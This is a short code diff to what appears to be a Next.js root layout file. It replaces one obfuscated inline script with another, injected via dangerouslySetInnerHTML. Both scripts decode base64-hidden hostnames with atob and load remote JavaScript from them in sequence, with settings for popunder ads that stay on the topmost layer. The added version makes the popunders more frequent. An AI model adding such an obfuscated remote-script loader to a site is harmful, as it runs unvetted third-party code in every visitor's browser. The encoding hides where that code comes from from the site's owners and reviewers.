@@ -27,16 +27,7 @@ export default function RootLayout({
           data-cfasync="false"
           dangerouslySetInnerHTML={{
             __html: `
-              (function(){
-                var w=window,k="e441f630f18f23143211514fa18360c2",b=[["siteId",284*68*357-594-970-1712628],["minBid",0.001],["popundersPerIP","0:1"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","always"]],
-                e=["d3d3LnhhZHNtYXJ0LmNvbS9sdUhxTW4vZlJZZ3dtL29lbWJlZC5taW4uanM=","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQvc3hpdmVseWpzLm1pbi5qcw==","d3d3LnJra3Nicmt3ZHFib3AuY29tL1hyU3NSci9GL3dlbWJlZC5taW4uanM=","d3d3Lm11ZmFvbW1lZi5jb20vanhpdmVseWpzLm1pbi5qcw=="],
-                j=-1,i,o,m=function(){
-                  clearTimeout(o);j++;if(e[j]&&!(1767017666000<(new Date).getTime()&&1<j)){
-                    i=w.document.createElement("script");i.type="text/javascript";i.async=!0;var s=w.document.getElementsByTagName("script")[0];
-                    i.src="https://"+atob(e[j]);i.crossOrigin="anonymous";i.onerror=m;i.onload=function(){clearTimeout(o);w[k.slice(0,16)+k.slice(0,16)]||m()};
-                    o=setTimeout(m,5E3);s.parentNode.insertBefore(i,s)}};
-                if(!w[k]){try{Object.freeze(w[k]=b)}catch(e){}m()}
-              })();
+              (function(){var d=window,e="e441f630f18f23143211514fa18360c2",k=[["siteId",113-792-543-591+5182005],["minBid",0.005],["popundersPerIP","10:1,2:1"],["delayBetween",10],["default",false],["defaultPerDay",240],["topmostLayer","always"]],f=["d3d3LnhhZHNtYXJ0LmNvbS9GS0ZaUFQvR0NBYXlvL2ZlbWJlZC5taW4uanM=","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQva3hpdmVseWpzLm1pbi5qcw==","d3d3Lm5jdndhaHJjdC5jb20veXJ5WS95S05JdFQvdmVtYmVkLm1pbi5qcw==","d3d3Lm11ZmFvbW1lZi5jb20vYnhpdmVseWpzLm1pbi5qcw=="],q=-1,g,y,p=function(){clearTimeout(y);q++;if(f[q]&&!(1767018608000<(new Date).getTime()&&1<q)){g=d.document.createElement("script");g.type="text/javascript";g.async=!0;var o=d.document.getElementsByTagName("script")[0];g.src="https://"+atob(f[q]);g.crossOrigin="anonymous";g.onerror=p;g.onload=function(){clearTimeout(y);d[e.slice(0,16)+e.slice(0,16)]||p()};y=setTimeout(p,5E3);o.parentNode.insertBefore(g,o)}};if(!d[e]){try{Object.freeze(d[e]=k)}catch(e){}p()}})();
             `,
           }}
         />
